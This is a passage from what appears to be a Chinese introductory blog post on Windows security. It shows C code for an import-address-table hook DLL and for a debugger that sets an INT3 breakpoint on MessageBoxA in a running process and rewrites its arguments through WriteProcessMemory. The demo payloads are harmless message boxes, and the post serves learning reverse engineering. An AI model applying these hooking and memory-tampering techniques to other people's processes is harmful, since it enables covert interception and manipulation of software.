<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h></span></span>


<span class="token keyword">void</span> <span class="token function">InstallHook</span><span class="token punctuation">(</span>LPCSTR DLLName<span class="token punctuation">,</span> PROC procAddr<span class="token punctuation">,</span> PROC hookAddr<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> WINAPI <span class="token function">Hook</span><span class="token punctuation">(</span>HWND hWnd<span class="token punctuation">,</span> LPCSTR lpText<span class="token punctuation">,</span> LPCSTR lpCaption<span class="token punctuation">,</span> UINT uType<span class="token punctuation">)</span><span class="token punctuation">;</span>


BOOL WINAPI <span class="token function">DllMain</span><span class="token punctuation">(</span>HMODULE hModule<span class="token punctuation">,</span> DWORD  fdwReason<span class="token punctuation">,</span> LPVOID lpReserved<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    PROC procAddr <span class="token operator">=</span> <span class="token function">GetProcAddress</span><span class="token punctuation">(</span><span class="token function">GetModuleHandleA</span><span class="token punctuation">(</span><span class="token string">"user32.dll"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"MessageBoxA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    PROC hookAddr <span class="token operator">=</span> <span class="token punctuation">(</span>PROC<span class="token punctuation">)</span>Hook<span class="token punctuation">;</span>
 <span class="token keyword">switch</span> <span class="token punctuation">(</span>fdwReason<span class="token punctuation">)</span>
 <span class="token punctuation">&#123;</span>
 <span class="token keyword">case</span> DLL_PROCESS_ATTACH<span class="token operator">:</span>
        <span class="token function">InstallHook</span><span class="token punctuation">(</span><span class="token string">"user32.dll"</span><span class="token punctuation">,</span> procAddr<span class="token punctuation">,</span> hookAddr<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">MessageBoxA</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token string">"InstallHook!"</span><span class="token punctuation">,</span> MB_OK<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">break</span><span class="token punctuation">;</span>
 <span class="token keyword">case</span> DLL_PROCESS_DETACH<span class="token operator">:</span>
        <span class="token function">InstallHook</span><span class="token punctuation">(</span><span class="token string">"user32.dll"</span><span class="token punctuation">,</span> hookAddr<span class="token punctuation">,</span> procAddr<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">break</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span>
 <span class="token keyword">return</span> TRUE<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">void</span> <span class="token function">InstallHook</span><span class="token punctuation">(</span>LPCSTR DLLName<span class="token punctuation">,</span> PROC procAddr<span class="token punctuation">,</span> PROC hookAddr<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
 HMODULE hModule <span class="token operator">=</span> <span class="token function">GetModuleHandle</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token comment">// 解析PE</span>
 PIMAGE_DOS_HEADER pDosHeader <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_DOS_HEADER<span class="token punctuation">)</span>hModule<span class="token punctuation">;</span>
 PIMAGE_NT_HEADERS pNtHeader <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_NT_HEADERS<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>SIZE_T<span class="token punctuation">)</span>hModule <span class="token operator">+</span> pDosHeader<span class="token operator">-></span>e_lfanew<span class="token punctuation">)</span><span class="token punctuation">;</span>
 DWORD szImageBase <span class="token operator">=</span> pNtHeader<span class="token operator">-></span>OptionalHeader<span class="token punctuation">.</span>ImageBase<span class="token punctuation">;</span>
 DWORD szImpRva <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span>pNtHeader<span class="token operator">-></span>OptionalHeader<span class="token punctuation">.</span>DataDirectory<span class="token punctuation">[</span>IMAGE_DIRECTORY_ENTRY_IMPORT<span class="token punctuation">]</span><span class="token punctuation">.</span>VirtualAddress<span class="token punctuation">;</span>
 PIMAGE_IMPORT_DESCRIPTOR pImpDes <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_IMPORT_DESCRIPTOR<span class="token punctuation">)</span><span class="token punctuation">(</span>szImageBase <span class="token operator">+</span> szImpRva<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 变量导入表</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>pImpDes<span class="token operator">-></span>Name<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        DWORD szNameAddr <span class="token operator">=</span> szImageBase <span class="token operator">+</span> pImpDes<span class="token operator">-></span>Name<span class="token punctuation">;</span>
        <span class="token keyword">char</span> szName<span class="token punctuation">[</span>MAXBYTE<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
        <span class="token function">strcpy_s</span><span class="token punctuation">(</span>szName<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>szNameAddr<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token function">_strlwr</span><span class="token punctuation">(</span>szName<span class="token punctuation">)</span><span class="token punctuation">,</span> DLLName<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>

            PIMAGE_THUNK_DATA pThunk <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_THUNK_DATA<span class="token punctuation">)</span><span class="token punctuation">(</span>pImpDes<span class="token operator">-></span>FirstThunk <span class="token operator">+</span> <span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span>hModule<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">while</span> <span class="token punctuation">(</span>pThunk<span class="token operator">-></span>u1<span class="token punctuation">.</span>Function<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>pThunk<span class="token operator">-></span>u1<span class="token punctuation">.</span>Function <span class="token operator">==</span> <span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span>procAddr<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token comment">//修改访问权限</span>
                    DWORD dwOldProtect<span class="token punctuation">;</span>
                    <span class="token function">VirtualProtectEx</span><span class="token punctuation">(</span><span class="token function">GetCurrentProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>LPVOID<span class="token punctuation">)</span><span class="token operator">&amp;</span>pThunk<span class="token operator">-></span>u1<span class="token punctuation">.</span>Function<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> PAGE_EXECUTE_READWRITE<span class="token punctuation">,</span> <span class="token operator">&amp;</span>dwOldProtect<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token comment">//修改IAT</span>
                    pThunk<span class="token operator">-></span>u1<span class="token punctuation">.</span>Function <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span>hookAddr<span class="token punctuation">;</span>
                    <span class="token function">VirtualProtectEx</span><span class="token punctuation">(</span><span class="token function">GetCurrentProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>LPVOID<span class="token punctuation">)</span><span class="token operator">&amp;</span>pThunk<span class="token operator">-></span>u1<span class="token punctuation">.</span>Function<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> dwOldProtect<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token keyword">break</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
                pThunk<span class="token operator">++</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        pImpDes<span class="token operator">++</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">int</span> WINAPI <span class="token function">Hook</span><span class="token punctuation">(</span>HWND hWnd<span class="token punctuation">,</span> LPCSTR lpText<span class="token punctuation">,</span> LPCSTR lpCaption<span class="token punctuation">,</span> UINT uType<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token function">MessageBoxA</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token string">"Hooked!"</span><span class="token punctuation">,</span> MB_OK<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="4-3-Debug-Hook"><a href="#4-3-Debug-Hook" class="headerlink" title="4.3 Debug Hook"></a>4.3 Debug Hook</h3><p>使用Win32 API 实现一个简单的调试器，在API 函数地址处构造INT3断点，中断后调用Hook函数。感觉没啥太大意义。</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>


CREATE_PROCESS_DEBUG_INFO g_cpdi<span class="token punctuation">;</span>
BYTE originOpcode <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
BYTE intOpcode <span class="token operator">=</span> <span class="token number">0xCC</span><span class="token punctuation">;</span>

<span class="token keyword">void</span> <span class="token function">InstallHook</span><span class="token punctuation">(</span>PROC procAddr<span class="token punctuation">,</span> LPDEBUG_EVENT pde<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">void</span> <span class="token function">UninstallHook</span><span class="token punctuation">(</span>PROC procAddr<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">void</span> <span class="token function">Hook</span><span class="token punctuation">(</span>PROC procAddr<span class="token punctuation">,</span> LPDEBUG_EVENT pde<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">void</span> <span class="token function">DebugLoop</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token function">DebugActiveProcess</span><span class="token punctuation">(</span><span class="token number">27464</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">DebugLoop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">void</span> <span class="token function">InstallHook</span><span class="token punctuation">(</span>PROC procAddr<span class="token punctuation">,</span> LPDEBUG_EVENT pde<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
 <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>g_cpdi<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pde<span class="token operator">-></span>u<span class="token punctuation">.</span>CreateProcessInfo<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>CREATE_PROCESS_DEBUG_INFO<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
 <span class="token function">ReadProcessMemory</span><span class="token punctuation">(</span>g_cpdi<span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span> procAddr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>originOpcode<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>BYTE<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">WriteProcessMemory</span><span class="token punctuation">(</span>g_cpdi<span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span> procAddr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>intOpcode<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>BYTE<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] 已添加断点！\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">void</span> <span class="token function">UninstallHook</span><span class="token punctuation">(</span>PROC procAddr<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
 <span class="token function">WriteProcessMemory</span><span class="token punctuation">(</span>g_cpdi<span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span> procAddr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>originOpcode<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>BYTE<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] 已取消断点！\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">void</span> <span class="token function">Hook</span><span class="token punctuation">(</span>PROC procAddr<span class="token punctuation">,</span> LPDEBUG_EVENT pde<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    PEXCEPTION_RECORD per <span class="token operator">=</span> <span class="token operator">&amp;</span>pde<span class="token operator">-></span>u<span class="token punctuation">.</span>Exception<span class="token punctuation">.</span>ExceptionRecord<span class="token punctuation">;</span>
    CONTEXT ctx<span class="token punctuation">;</span>
    SIZE_T titleAddr<span class="token punctuation">;</span>
    <span class="token keyword">char</span> title<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Hooked"</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>per<span class="token operator">-></span>ExceptionCode <span class="token operator">==</span> EXCEPTION_BREAKPOINT<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>per<span class="token operator">-></span>ExceptionAddress <span class="token operator">==</span> procAddr<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] 程序已中断！\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">// 1. 解除hook</span>
            <span class="token function">UninstallHook</span><span class="token punctuation">(</span>procAddr<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">// 2. 获取线程上下文</span>
            ctx<span class="token punctuation">.</span>ContextFlags <span class="token operator">=</span> CONTEXT_CONTROL<span class="token punctuation">;</span>
            <span class="token function">GetThreadContext</span><span class="token punctuation">(</span>g_cpdi<span class="token punctuation">.</span>hThread<span class="token punctuation">,</span> <span class="token operator">&amp;</span>ctx<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">// 3. 更改参数值</span>
            <span class="token function">ReadProcessMemory</span><span class="token punctuation">(</span>g_cpdi<span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span> <span class="token punctuation">(</span>LPCVOID<span class="token punctuation">)</span><span class="token punctuation">(</span>ctx<span class="token punctuation">.</span>Esp <span class="token operator">+</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>titleAddr<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>SIZE_T<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">//printf("[-] ESP地址：%ph\n", ctx.Esp);</span>
            <span class="token comment">//printf("[-] MSG函数参数为：%x\n", &amp;titleAddr);</span>
            DWORD dwOldProtect<span class="token punctuation">;</span>
            <span class="token function">VirtualProtectEx</span><span class="token punctuation">(</span>g_cpdi<span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span> <span class="token punctuation">(</span>LPVOID<span class="token punctuation">)</span>titleAddr<span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> PAGE_EXECUTE_READWRITE<span class="token punctuation">,</span> <span class="token operator">&amp;</span>dwOldProtect<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">WriteProcessMemory</span><span class="token punctuation">(</span>g_cpdi<span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span> <span class="token punctuation">(</span>LPVOID<span class="token punctuation">)</span>titleAddr<span class="token punctuation">,</span> <span class="token punctuation">(</span>LPVOID<span class="token punctuation">)</span>title<span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">VirtualProtectEx</span><span class="token punctuation">(</span>g_cpdi<span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span> <span class="token punctuation">(</span>LPVOID<span class="token punctuation">)</span>titleAddr<span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> dwOldProtect<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">// 4. 还原EIP指针</span>
            ctx<span class="token punctuation">.</span>Eip <span class="token operator">=</span> <span class="token punctuation">(</span>SIZE_T<span class="token punctuation">)</span>procAddr<span class="token punctuation">;</span>
            <span class="token function">SetThreadContext</span><span class="token punctuation">(</span>g_cpdi<span class="token punctuation">.</span>hThread<span class="token punctuation">,</span> <span class="token operator">&amp;</span>ctx<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">// 5. 恢复运行进程</span>
            <span class="token function">ContinueDebugEvent</span><span class="token punctuation">(</span>pde<span class="token operator">-></span>dwProcessId<span class="token punctuation">,</span> pde<span class="token operator">-></span>dwThreadId<span class="token punctuation">,</span> DBG_CONTINUE<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">// 6. Hook</span>
            <span class="token function">WriteProcessMemory</span><span class="token punctuation">(</span>g_cpdi<span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span> procAddr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>intOpcode<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>BYTE<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">void</span> <span class="token function">DebugLoop</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    PROC procAddr <span class="token operator">=</span> <span class="token function">GetProcAddress</span><span class="token punctuation">(</span><span class="token function">LoadLibraryA</span><span class="token punctuation">(</span><span class="token string">"user32.dll"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"MessageBoxA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] 已附加到程序！\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] Hook API地址：%ph\n"</span><span class="token punctuation">,</span> procAddr<span class="token punctuation">)</span><span class="token punctuation">;</span>
    DEBUG_EVENT de<span class="token punctuation">;</span>     <span class="token comment">//调试事件</span>
    <span class="token comment">//等待调试事件的发生</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">WaitForDebugEvent</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>de<span class="token punctuation">,</span> INFINITE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//等待调试信息，收到调试信息立即返回进入循环</span>

        <span class="token comment">// 被调试进程生成或附加事件,被调试进程启动或者附加时执行</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>CREATE_PROCESS_DEBUG_EVENT <span class="token operator">==</span> de<span class="token punctuation">.</span>dwDebugEventCode<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token function">InstallHook</span><span class="token punctuation">(</span>procAddr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>de<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token comment">//异常事件调试，负责处理INT3中断事件</span>
        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>EXCEPTION_DEBUG_EVENT <span class="token operator">==</span> de<span class="token punctuation">.</span>dwDebugEventCode<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token function">Hook</span><span class="token punctuation">(</span>procAddr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>de<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token comment">//被调试进程终止事件，进程中止后，调试器也结束</span>
        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>EXIT_PROCESS_DEBUG_EVENT <span class="token operator">==</span> de<span class="token punctuation">.</span>dwDebugEventCode<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token comment">//再次运行被调试者</span>
        <span class="token function">ContinueDebugEvent</span><span class="token punctuation">(</span>de<span class="token punctuation">.</span>dwProcessId<span class="token punctuation">,</span> de<span class="token punctuation">.</span>dwThreadId<span class="token punctuation">,</span> DBG_CONTINUE<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="5-写在最后"><a href="#5-写在最后" class="headerlink" title="5 写在最后"></a>5 写在最后</h2><p>这是一篇入门性质的文章，列举了Windows系统中的一些安全问题。我在写这篇文章之前惊奇的发现我做的这些实验竟然都在《逆向工程核心原理》一书中的前几章中提到了，所以就把这4部分放在一起做了总结。<br>第一篇文章，写的很仓促很潦草，如果有任何错误和遗漏恳请大家的指正和补充。</p>
<h2 id="6-参考"><a href="#6-参考" class="headerlink" title="6 参考"></a>6 参考</h2><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/Antonin-Deniau/cave_miner">https://github.com/Antonin-Deniau/cave_miner</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/HackerajOfficial/injectAllTheThings">https://github.com/HackerajOfficial/injectAllTheThings</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/ctxis/DLLHSC">https://github.com/ctxis/DLLHSC</a></li>
<li>kn0sky的博客：<a target="_blank" rel="noopener" href="https://www.kn0sky.com/?p=31">https://www.kn0sky.com/?p=31</a></li>
</ul>

        </article>
        <section class="post-near">
            <ul>
                
                    <li>上一篇: <a href="/Windows/ef0c23ba92f6.html">保护模式——Windows安全入门（二）</a></li>
                
                
                    <li>下一篇: 看完啦 (つд⊂)</li>
                
            </ul>
        </section>
        
    
        <section class="post-author">
        
            <figure class="author-avatar">
                <img src="https://i0.imgs.ovh/2024/03/08/QTf8m.jpeg" alt="reop" />
            </figure>
        
            <div class="author-info">
                <h4>reop</h4>
                <p>太菜了，懒得喷</p>
            </div>
        </section>
    
    </div>
</main>

    <footer>
    <div class="buttons">
        <a class="to-top" href="#"></a>
    </div>
    <div class="wrap min">
        <section class="widget">
            <div class="row">
                <div class="col-m-4">
                    <h3 class="title-recent">最新文章：</h3>
                    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/Windows/095e8ea6d26d.html">进程、线程和APC——Windows安全入门（四）</a></li><li class="post-list-item"><a class="post-list-link" href="/Windows/f53a5d4a7ae2.html">驱动、句柄和系统调用——Windows安全入门（三）</a></li><li class="post-list-item"><a class="post-list-link" href="/Windows/ef0c23ba92f6.html">保护模式——Windows安全入门（二）</a></li><li class="post-list-item"><a class="post-list-link" href="/Windows/775dd0960ce1.html">注入、劫持和Hook——Windows安全入门（一）</a></li></ul>
                </div>
                <div class="col-m-4">
                    <h3 class="title-date">时光机：</h3>
                    <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/03/">March 2024</a></li></ul>
                </div>
                <div class="col-m-4">
                    <h3 class="title-tags">标签云：</h3>
                    
                </div>
            </div>
        </section>
        <section class="sub-footer">
            <p>© 2024 <a href="/">REOP</a>. All Rights Reserved. Theme By <a href="https://github.com/Dreamer-Paul/Hingle" target="_blank" rel="nofollow">Hingle</a>.</p>
        </section>
    </div>
</footer>


<script src="/static/kico.js"></script>
<script src="/static/hingle.js"></script>


<script>var hingle = new Paul_Hingle({"copyright":false,"night":false});</script>

  </body>
</html>
